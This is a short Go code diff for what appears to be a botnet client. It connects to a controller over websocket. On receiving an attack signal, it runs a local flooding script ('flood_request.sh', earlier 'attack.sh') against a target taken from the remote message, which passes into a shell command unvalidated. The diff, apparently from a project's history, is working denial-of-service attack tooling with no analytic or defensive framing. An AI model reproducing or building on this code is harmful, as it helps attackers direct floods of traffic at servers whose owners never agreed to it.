@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"log"
 	"os/exec"
+	"path/filepath"
 	"strings"
 
 	"github.com/gorilla/websocket"
@@ -58,7 +59,8 @@ func (b *Bot) Execute(fname string, args string) error {
 
 	// TODO: Also validate valid address
 
-	cmd := exec.Command("wget", "-qO-", args)
+	cmd := exec.Command("bash", filepath.Join("../scripts", fname), args)
+	//cmd := exec.Command("wget", "-qO-", args)
 	if output, err := cmd.CombinedOutput(); err != nil {
 		errMsg = fmt.Sprintf("[×] Failed during exection of %s: %s\n%s", fname, err, output)
 		b.Conn.WriteJSON(Message{
@@ -98,7 +100,7 @@ func (b *Bot) Listen() error {
 
 		log.Printf("[C] Received: %s", msg.Payload)
 		if strings.HasPrefix(msg.Payload, SIGNAL_ATK) {
-			if err := b.Execute("attack.sh", strings.Split(msg.Payload, SIGNAL_ATK)[1]); err != nil {
+			if err := b.Execute("flood_request.sh", strings.Split(msg.Payload, SIGNAL_ATK)[1]); err != nil {
 				log.Printf(err.Error())
 			}
 		}
